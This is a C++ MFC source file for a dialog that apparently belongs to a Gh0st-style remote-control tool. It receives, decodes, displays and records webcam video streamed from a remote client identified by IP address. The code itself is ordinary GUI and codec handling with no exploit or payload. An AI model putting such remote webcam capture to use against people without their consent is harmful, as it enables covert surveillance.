﻿// CVideoDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CVideoDlg.h"
#include"../../common/macros.h"
#include "afxdialogex.h"

enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// 视频压缩
	IDM_SAVEAVI,					// 保存录像
};
// CVideoDlg 对话框

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)


void CVideoDlg::SaveAvi(void)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile.Empty();
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_strIPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "视频文件(*.avi)|*.avi|", this);
	if (dlg.DoModal() != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_BitmapInfor_Full))
	{
		m_aviFile.Empty();
		MessageBox("创建录像文件失败!");
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}
}

CVideoDlg::CVideoDlg(CWnd* pParent, CIOCPServer* IOCPServer, ClientContext* ContextObject )
	: CDialog(IDD_VIDEO, pParent)
{
	m_nCount = 0;
	m_aviFile.Empty();
	m_ContextObject = ContextObject;
	m_iocpServer = IOCPServer;
	m_BitmapInfor_Full = NULL;
	m_pVideoCodec = NULL;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->m_Socket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);
	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";

	m_BitmapData_Full = NULL;
	m_BitmapCompressedData_Full = NULL;
	ResetScreen();

}

void CVideoDlg::ResetScreen(void)
{
	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	int	iBitMapInforSize = m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_BitmapInfor_Full = (LPBITMAPINFO) new BYTE[iBitMapInforSize];
	memcpy(m_BitmapInfor_Full, m_ContextObject->m_DeCompressionBuffer.GetBuffer(1), iBitMapInforSize);

	m_BitmapData_Full = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
	m_BitmapCompressedData_Full = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
}

CVideoDlg::~CVideoDlg()
{
	if (!m_aviFile.IsEmpty())
	{
		SaveAvi();
		m_aviFile.Empty();
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	if (m_BitmapData_Full)
	{
		delete m_BitmapData_Full;
		m_BitmapData_Full = NULL;
	}

	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_BitmapCompressedData_Full)
	{
		delete m_BitmapCompressedData_Full;
		m_BitmapCompressedData_Full = NULL;
	}
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
//	ON_WM_SYSCHAR()
ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CVideoDlg 消息处理程序


void CVideoDlg::OnClose()
{
	if (!m_aviFile.IsEmpty())
	{
		SaveAvi();
		m_aviFile.Empty();
	}

	CancelIo((HANDLE)m_ContextObject->m_Socket);
	closesocket(m_ContextObject->m_Socket);

	CDialog::OnClose();
}

void CVideoDlg::OnReceiveComplete(void)
{
	++m_nCount;

	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
	{
		DrawDIB();//这里是绘图函数，转到他的代码看一下
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}

void CVideoDlg::DrawDIB(void)
{
	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu == NULL)
		return;

	const int nHeadLen = 1 + 1 + 4;

	LPBYTE	szBuffer = m_ContextObject->m_DeCompressionBuffer.GetBuffer();
	UINT	ulBufferLen = m_ContextObject->m_DeCompressionBuffer.GetBufferLen();
	if (szBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
	{
		// 第一次，没有压缩，说明服务端不支持指定的解码器
		if (m_nCount == 1)
		{
			SysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_BitmapData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);
	}
	else // 解码
	{
		////这里缓冲区里的的第二个字符正好是是否视频解码 
		InitCodec(*(LPDWORD)(szBuffer + 2)); //判断
		if (m_pVideoCodec != NULL)
		{
			SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen); //视频没有解压
			//这里开始解码，解码后就是同未压缩的一样了 显示到对话框上。 接下来开始视频保存成avi格式
			m_pVideoCodec->DecodeVideoData(m_BitmapCompressedData_Full, ulBufferLen - nHeadLen,
				(LPBYTE)m_BitmapData_Full, NULL, NULL);  //将视频数据解压
		}
	}

	PostMessage(WM_PAINT);
}

void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))
	{
		OutputDebugStringA("======> InitCompressor failed \n");
		delete m_pVideoCodec;
		// 置NULL, 发送时判断是否为NULL来判断是否压缩
		m_pVideoCodec = NULL;
		// 通知服务端不启用压缩
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}
}

void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting

	if (m_BitmapData_Full == NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
	(
		m_hDD,
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_BitmapInfor_Full,
		m_BitmapData_Full,
		0, 0,
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight,
		DDF_SAME_HDC
	);

	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_BitmapData_Full);
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		const LPCTSTR lpTipsString = "Recording";
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
}


void CVideoDlg::OnReceive()
{
	if (m_ContextObject == NULL)
		return;
	CString str;
	str.Format(_T("\\\\%s %d * %d 第%d帧 %d%%"), m_strIPAddress, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight,
		m_nCount, m_ContextObject->m_nTransferProgress);
	SetWindowText(str);
}

void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	switch (nID)
	{
	case IDM_SAVEAVI:
	{
		SaveAvi();
		break;
	}
	case IDM_ENABLECOMPRESS:
	{
		CMenu* pSysMenu = GetSystemMenu(FALSE);
		bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		bIsChecked = !bIsChecked;
		BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
		if (!bIsChecked)
			bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
		break;
	}
	}

	CDialog::OnSysCommand(nID, lParam);
}


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		m_hDD = DrawDibOpen();

		m_hDC = ::GetDC(m_hWnd);
		SysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "视频压缩(&C)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存录像(&V)");
		SysMenu->AppendMenu(MF_SEPARATOR);

		CString strString;

		strString.Format("%s - 视频管理 %d×%d", m_strIPAddress, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		SetWindowText(strString);

		BYTE bToken = COMMAND_NEXT;

		m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	}

	return TRUE;
}
